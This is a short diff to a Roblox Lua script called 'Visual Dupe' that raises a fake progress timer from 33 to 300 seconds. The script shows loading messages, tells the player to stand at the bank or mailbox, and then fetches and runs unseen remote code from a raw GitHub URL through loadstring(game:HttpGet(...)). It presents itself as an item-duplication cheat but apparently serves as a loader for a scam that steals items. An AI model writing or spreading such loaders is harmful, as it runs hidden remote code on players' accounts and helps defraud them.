@@ -10,6 +10,6 @@ _G.ScriptName = "Visual Dupe"
 _G.FirstText = "Script Preparing"
 _G.SecondText = "Visual Dupe almost Done..."
 _G.ThirdText = "Make Sure Your At Bank/Mailbox..."
-_G.WaitingTime = 33 -- it's the time between 0% and 100% in secondes
+_G.WaitingTime = 300 -- it's the time between 0% and 100% in secondes
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
